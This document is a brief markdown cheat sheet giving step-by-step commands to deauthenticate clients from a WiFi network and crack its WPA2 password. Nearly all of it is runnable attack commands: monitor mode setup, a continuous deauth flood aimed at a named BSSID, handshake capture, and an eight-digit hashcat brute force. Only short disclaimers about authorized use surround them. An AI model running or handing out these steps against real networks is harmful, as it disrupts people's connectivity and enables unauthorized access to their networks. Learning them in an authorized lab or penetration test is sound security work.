# 📜 All Commands for WiFi Deauth & WPA2 Cracking

> **Note:** These commands are intended for ethical hacking in authorized environments only. ⚠️

## 1️⃣ Check WiFi Dongle Status

```bash
iwconfig
```

## 2️⃣ Enable Monitor Mode

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan1
iwconfig
```

## 3️⃣ Discover Nearby WiFi Networks

```bash
sudo airodump-ng wlan1
```

## 4️⃣ Target a Specific Network

```bash
sudo airodump-ng wlan1 -d C0:C9:E3:83:26:46
```

## 5️⃣ Deauthenticate Connected Devices

```bash
sudo aireplay-ng --deauth 0 -a C0:C9:E3:83:26:46 wlan1
```

## 6️⃣ Capture WPA2 Handshake

```bash
sudo airodump-ng -w hack1 -c 4 --bssid C0:C9:E3:83:26:46 wlan1
```

## 7️⃣ Convert .cap to .hc22000 Format

```bash
sudo hcxpcapngtool -o wpa2.hc22000 hack1-01.cap
```

## 8️⃣ Crack the WPA2 Password with Hashcat

```bash
hashcat -m 22000 -a 3 wpa2.hc22000 ?d?d?d?d?d?d?d?d
```

## 9️⃣ (Optional) Restore Network Services

```bash
sudo service NetworkManager restart
```

---

> 🔐 Always use these tools responsibly. Unauthorized access is illegal.
